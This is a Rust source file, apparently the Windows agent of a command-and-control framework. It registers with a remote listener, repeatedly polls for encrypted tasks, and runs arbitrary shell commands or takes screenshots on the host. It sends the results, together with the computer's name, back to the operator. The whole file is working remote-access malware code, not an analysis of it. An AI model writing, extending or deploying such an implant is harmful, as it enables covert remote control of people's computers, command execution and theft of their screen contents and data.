// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use std::{thread, time};
use windows::core::{Error, HSTRING};

use crate::{
    core::{
        agents::AgentData,
        handlers::win::{
            async_handler::HRequestAsync,
            handler::{HConnect, HInternet, HRequest, HSession},
        },
        systeminfo::systeminfo_windows::get_computer_name,
        tasks::{
            screenshot::screenshot,
            win::shell::shell,
        },
    },
    Config,
    crypto::aesgcm::{encrypt, decrypt, encode, decode},
    utils::random::random_name,
};

pub async fn run(config: Config) -> Result<(), Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    let hsession = HSession::new()?;
    let mut hconnect = HConnect::new(
        &hsession,
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    )?;

    // Get agent info for registration
    let agent_name = random_name("agent".to_owned());
    let hostname = match get_computer_name() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut ra = AgentData::new(
        agent_name,
        hostname,
        os,
        arch,
        listener_url,
        config.key.to_string(),
        config.nonce.to_string()
    );
    let ra_json = serde_json::to_string(&ra).unwrap();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(sleep);
    
        // Register agent
        let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
            Ok(resp) => {
                registered = true;
                let decoded = decode(resp.as_bytes());
                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
                String::from_utf8(decrypted).unwrap()
            }
            Err(e) => {
                continue;
            }
        };
        println!("{}", response);
    }

    loop {
        // TODO: Implement graceful shutdown.

        thread::sleep(sleep);

        // Get task
        let task = match post(&mut hconnect, "/task/ask".to_owned(), ra_json.to_string()).await {
            Ok(resp) => {
                let decoded = decode(resp.as_bytes());
                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
                String::from_utf8(decrypted).unwrap()
            },
            Err(e) => {
                println!("Error fetching /task/ask: {:?}", e);
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "screenshot" => {
                // Take a screenshot
                match screenshot().await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                let ra_json = serde_json::to_string(&ra).unwrap();
                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
            }
            "shell" => {
                // Execute shell command
                match shell(task_args[1..].join(" ")).await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                let ra_json = serde_json::to_string(&ra).unwrap();
                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
            }
            _ => {
                continue;
            }
        }
    }

    hconnect.h.close();
    hsession.h.close();

    Ok(())
}

async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error> {
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
        None,
    )?;
    
    hrequest.send_req(
        HSTRING::new(),
        0,
        0)?;
    hrequest.recv_resp()?;

    let mut response = String::new();
    
    loop {
        let mut dw_size = 0;

        if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
            println!("Error querying data available: {}", e.to_string());
        }

        if dw_size == 0 {
            break;
        }

        let mut buffer: Vec<u8> = vec![0; dw_size as usize];

        let r = hrequest.read_data(dw_size, &mut buffer);
        match r {
            Ok(_) => {
                response = response + String::from_utf8_lossy(&buffer).to_string().as_str();
            },
            Err(e) => println!("Error: {:?}", e),
        }

        if dw_size > 0 {
            break;
        }
    }

    hrequest.h.close();

    Ok(response)
}

async fn post(hconnect: &mut HConnect, url_path: String, data: String) -> Result<String, Error> {    
    let hrequest = HRequest::new(
        hconnect,
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
        Some(vec![HSTRING::from("application/json")]),
    )?;

    let mut hreq_async = HRequestAsync::new(hrequest);

    let headers = HSTRING::from("Content-Type: application/json".to_string());

    hreq_async.async_send_req(headers, data.len() as u32).await?;
    hreq_async.async_write_data(
        data.as_bytes(),
        data.len() as u32
    ).await?;
    hreq_async.async_recv_resp().await?;

    let mut response = String::new();

    loop {
        let dw_size = hreq_async.async_query_data_available().await?;
        if dw_size == 0 {
            break;
        }

        for _ in 0..dw_size {
            let mut temp_buf = [0 as u8];
            let buf = temp_buf.as_mut_slice();
            let len_read = hreq_async
                .async_read_data(buf.len() as u32, buf).await?;
            assert!(buf.len() == len_read as usize);
            response.push(buf[0] as char);
        }
    }
    
    hreq_async.h.h.close();

    Ok(response)
}

fn close_handler(h: &mut HInternet) {
    h.close();
}